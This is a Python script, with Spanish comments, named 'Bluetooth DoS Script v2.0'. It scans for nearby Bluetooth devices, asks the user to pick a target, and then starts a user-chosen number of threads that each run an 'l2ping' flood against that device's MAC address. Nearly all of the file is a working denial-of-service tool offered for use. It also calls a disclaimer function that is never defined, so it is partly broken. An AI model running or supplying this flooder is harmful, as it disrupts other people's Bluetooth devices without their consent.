import os
import subprocess
import threading
import time
import sys

C_RED = '\x1b[31m'
C_GREEN = '\x1b[32m'
C_YELLOW = '\x1b[33m'
C_BLUE = '\x1b[34m'
C_RESET = '\x1b[0m'

def print_logo():
    """Imprime el logo del script."""
    print(f"""{C_BLUE}
    ╔══════════════════════════════════════════╗
    ║        Bluetooth DoS Script v2.0         ║
    ╚══════════════════════════════════════════╝
    {C_RESET}""")
    
def find_bluetooth_adapters():
    """Detecta y devuelve una lista de adaptadores Bluetooth disponibles (ej. hci0, hci1)."""
    try:
        output = subprocess.check_output("hciconfig", shell=True, text=True, stderr=subprocess.DEVNULL)
        adapters = [line.split(':')[0] for line in output.splitlines() if line.startswith('hci')]
        return adapters
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{C_RED}[!] Error: No se pudo ejecutar 'hciconfig'. Asegúrate de que 'bluez-utils' esté instalado.{C_RESET}")
        return []

def scan_devices(adapter):
    """Escanea en busca de dispositivos Bluetooth usando un adaptador específico."""
    print(f"\n{C_GREEN}[*] Escaneando dispositivos usando {adapter}...{C_RESET}")
    try:
        command = f"hcitool -i {adapter} scan"
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
        
        if result.returncode != 0:
            print(f"{C_RED}[!] Error durante el escaneo: {result.stderr.strip()}{C_RESET}")
            return []

        lines = result.stdout.strip().splitlines()
        devices = []
        for line in lines[1:]:
            parts = line.strip().split('\t')
            if len(parts) >= 2:
                mac_address = parts[0]
                device_name = parts[1] if len(parts) > 1 else "N/A"
                devices.append({"mac": mac_address, "name": device_name})
        return devices
        
    except subprocess.TimeoutExpired:
        print(f"{C_RED}[!] El escaneo tomó demasiado tiempo. Inténtalo de nuevo.{C_RESET}")
        return []
    except FileNotFoundError:
        print(f"{C_RED}[!] Error: El comando 'hcitool' no se encontró. Asegúrate de que 'bluez-utils' esté instalado.{C_RESET}")
        return []

def start_l2ping_flood(target_addr, package_size, adapter):
    """
    Inicia un proceso de l2ping flood.
    Usa subprocess.Popen para no bloquear el hilo y redirige la salida.
    """
    command = ['l2ping', '-i', adapter, '-s', str(package_size), '-f', target_addr]
    try:
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print(f"{C_RED}[!] Error: El comando 'l2ping' no se encontró. Asegúrate de que 'bluez-utils' esté instalado.{C_RESET}")
        return
    except Exception as e:
        print(f"{C_RED}[!] Error al iniciar el thread de l2ping: {e}{C_RESET}")
        return


def main():
    """Función principal del script."""
    os.system('clear')
    print_logo()

    if not get_disclaimer_approval():
        print(f"\n{C_YELLOW}[*] Operación cancelada por el usuario.{C_RESET}")
        sys.exit(0)

    adapters = find_bluetooth_adapters()
    if not adapters:
        sys.exit(1)
    
    if len(adapters) == 1:
        adapter = adapters[0]
        print(f"\n{C_GREEN}[*] Adaptador Bluetooth detectado: {adapter}{C_RESET}")
    else:
        print("\n[*] Múltiples adaptadores Bluetooth detectados. Por favor, elige uno:")
        for i, ad in enumerate(adapters):
            print(f"  [{i}] {ad}")
        try:
            choice = int(input("> "))
            adapter = adapters[choice]
        except (ValueError, IndexError):
            print(f"{C_RED}[!] Selección inválida. Usando {adapters[0]} por defecto.{C_RESET}")
            adapter = adapters[0]

    devices = scan_devices(adapter)
    if not devices:
        print(f"{C_RED}\n[!] No se encontraron dispositivos. Asegúrate de que el Bluetooth esté activado y los dispositivos sean detectables.{C_RESET}")
        sys.exit(1)

    print("\n--- Dispositivos Encontrados ---")
    print(f"| {'ID':<3} | {'MAC Address':<18} | {'Nombre del Dispositivo':<20} |")
    print("|" + "-"*5 + "|" + "-"*20 + "|" + "-"*26 + "|")
    for i, device in enumerate(devices):
        print(f"| {i:<3} | {device['mac']:<18} | {device['name']:<24} |")
    
    try:
        target_input = input("\n[*] Introduce el ID o la MAC del objetivo > ")
        if target_input.isdigit() and 0 <= int(target_input) < len(devices):
            target_addr = devices[int(target_input)]['mac']
        else:
            target_addr = target_input
        
        print(f"{C_GREEN}[*] Objetivo seleccionado: {target_addr}{C_RESET}")

        package_size = int(input("[*] Tamaño de los paquetes (ej. 600) > "))
        thread_count = int(input("[*] Número de hilos (ej. 100) > "))

    except (ValueError, TypeError):
        print(f"\n{C_RED}[!] Error: Entrada inválida. El tamaño y los hilos deben ser números enteros.{C_RESET}")
        sys.exit(1)
    
    print("\n[*] Preparando el ataque...")
    time.sleep(1)

    for i in range(thread_count):
        t = threading.Thread(target=start_l2ping_flood, args=[target_addr, package_size, adapter])
        t.daemon = True 
        t.start()

    print(f"{C_GREEN}[*] Ataque iniciado contra {target_addr} con {thread_count} hilos.{C_RESET}")
    print(f"{C_YELLOW}[*] Presiona CTRL+C para detener el ataque.{C_RESET}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{C_YELLOW}[*] Ataque detenido por el usuario. Cerrando...{C_RESET}")
        sys.exit(0)

if __name__ == '__main__':
    if os.geteuid() != 0:
        print(f"{C_RED}[!] Este script requiere privilegios de superusuario (root) para acceder al hardware de Bluetooth.{C_RESET}")
        print(f"{C_YELLOW}Por favor, ejecútalo con 'sudo python3 {sys.argv[0]}'{C_RESET}")
        sys.exit(1)
        
    main()
